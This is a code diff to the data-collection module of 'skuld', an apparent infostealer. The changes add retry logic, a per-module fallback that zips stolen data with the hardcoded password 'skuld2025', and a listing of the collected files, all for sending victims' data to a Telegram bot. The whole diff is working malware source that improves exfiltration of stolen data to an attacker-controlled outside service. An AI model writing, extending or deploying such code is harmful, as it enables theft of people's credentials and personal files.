@@ -6,6 +6,7 @@ import (
 	"path/filepath"
 	"sync"
 	"time"
+	"strings"
 
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/telegram"
@@ -79,6 +80,11 @@ func (dc *DataCollector) SendCollectedData() error {
 	dc.mutex.Lock()
 	defer dc.mutex.Unlock()
 
+	// Check if we have any data to send
+	if dc.dataCount == 0 {
+		return fmt.Errorf("no data collected")
+	}
+
 	// Create timestamp for unique archive name
 	timestamp := time.Now().Format("2006-01-02_15-04-05")
 	archiveName := fmt.Sprintf("skuld-data_%s.zip", timestamp)
@@ -90,11 +96,16 @@ func (dc *DataCollector) SendCollectedData() error {
 		return fmt.Errorf("failed to create archive: %v", err)
 	}
 
-	// Get file size for caption
+	// Check if archive was created and has content
 	fileInfo, err := os.Stat(archivePath)
 	if err != nil {
-		return fmt.Errorf("failed to get file info: %v", err)
+		return fmt.Errorf("failed to get archive info: %v", err)
 	}
+	
+	if fileInfo.Size() == 0 {
+		return fmt.Errorf("archive is empty")
+	}
+
 	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)
 
 	// Create detailed caption
@@ -116,14 +127,26 @@ func (dc *DataCollector) SendCollectedData() error {
 ✅ Games Data
 
 🔐 **Security:** Archive is password protected
-⚡ **Status:** All modules executed successfully`, 
-		archiveName, fileSizeMB, password, dc.dataCount)
+⚡ **Status:** All modules executed successfully
 
-	// Send archive via Telegram
-	if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
-		// Clean up and return error
-		os.Remove(archivePath)
-		return fmt.Errorf("failed to send data via Telegram: %v", err)
+📋 **Contents:**
+%s`, 
+		archiveName, fileSizeMB, password, dc.dataCount, dc.getDirectoryTree())
+
+	// Try to send archive via Telegram
+	maxRetries := 3
+	for i := 0; i < maxRetries; i++ {
+		if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
+			if i == maxRetries-1 {
+				// Clean up and return error
+				os.Remove(archivePath)
+				return fmt.Errorf("failed to send data via Telegram after %d retries: %v", maxRetries, err)
+			}
+			// Wait before retry
+			time.Sleep(time.Duration(i+1) * time.Second)
+			continue
+		}
+		break
 	}
 
 	// Send additional info message
@@ -147,9 +170,65 @@ func (dc *DataCollector) SendCollectedData() error {
 
 	// Clean up
 	os.Remove(archivePath)
-	os.RemoveAll(dc.TempDir)
 
 	return nil
+}
+
+func (dc *DataCollector) SendDataInParts() error {
+	dc.mutex.Lock()
+	defer dc.mutex.Unlock()
+
+	// Send data in smaller parts if main archive fails
+	dirs, err := os.ReadDir(dc.TempDir)
+	if err != nil {
+		return fmt.Errorf("failed to read temp directory: %v", err)
+	}
+
+	for _, dir := range dirs {
+		if !dir.IsDir() {
+			continue
+		}
+
+		modulePath := filepath.Join(dc.TempDir, dir.Name())
+		archiveName := fmt.Sprintf("skuld-%s.zip", dir.Name())
+		archivePath := filepath.Join(os.TempDir(), archiveName)
+
+		// Create archive for this module
+		if err := fileutil.ZipWithPassword(modulePath, archivePath, "skuld2025"); err != nil {
+			continue
+		}
+
+		// Check file size
+		fileInfo, err := os.Stat(archivePath)
+		if err != nil || fileInfo.Size() == 0 {
+			os.Remove(archivePath)
+			continue
+		}
+
+		caption := fmt.Sprintf("📦 **%s Module Data**\nPassword: skuld2025", strings.Title(dir.Name()))
+		
+		// Send this module's data
+		if err := dc.TelegramBot.SendDocument(archivePath, caption); err == nil {
+			dc.TelegramBot.SendMessage(fmt.Sprintf("✅ %s data sent successfully", dir.Name()))
+		}
+
+		// Clean up
+		os.Remove(archivePath)
+		time.Sleep(1 * time.Second) // Avoid rate limiting
+	}
+
+	return nil
+}
+
+func (dc *DataCollector) getDirectoryTree() string {
+	tree := fileutil.Tree(dc.TempDir, "")
+	if len(tree) > 1000 {
+		lines := strings.Split(tree, "\n")
+		if len(lines) > 30 {
+			tree = strings.Join(lines[:30], "\n") + "\n... (truncated)"
+		}
+	}
+	return tree
 }
 
 func (dc *DataCollector) SendMessage(message string) error {
